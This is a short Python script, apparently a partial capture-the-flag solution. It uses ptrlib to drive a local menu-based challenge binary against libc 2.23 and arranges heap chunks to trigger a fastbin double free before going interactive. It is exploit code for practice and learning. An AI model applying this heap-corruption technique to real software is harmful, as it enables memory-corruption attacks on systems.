from ptrlib import *

def add(name, size, desc):
    sock.sendlineafter("choice:", "1")
    sock.sendafter("name:", name)
    sock.sendlineafter("size:", str(size))
    sock.sendafter("Description:", desc)
    return

def delete(index):
    sock.sendlineafter("choice:", "2")
    sock.sendlineafter("index:", str(index))
    return

libc = ELF("./libc-2.23.so")
sock = Socket("localhost", 9999)

"""Make chunks like this:
+------+
| 0x30 | 0
+------+
| 0x20 | 0
+------+
| 0x30 | 1, 2
+------+
| 0x40 | 1
+------+
| 0xa0 | 2
+------+
"""
fake_chunk = b'A' * 0x50
fake_chunk = p64(0) + p64(0x31)
add('A', 0x18, 'B')        # malloc(0x20); malloc(0x18);
add('A', 0x38, fake_chunk) # malloc(0x20); malloc(0x38);
delete(1)
add('A', 0x98, 'Hello')    # malloc(0x20); malloc(0x98);
delete(2)
delete(0)
delete(2) # fastbin --> 2 --> 0 --> 2 --> ...

sock.interactive()
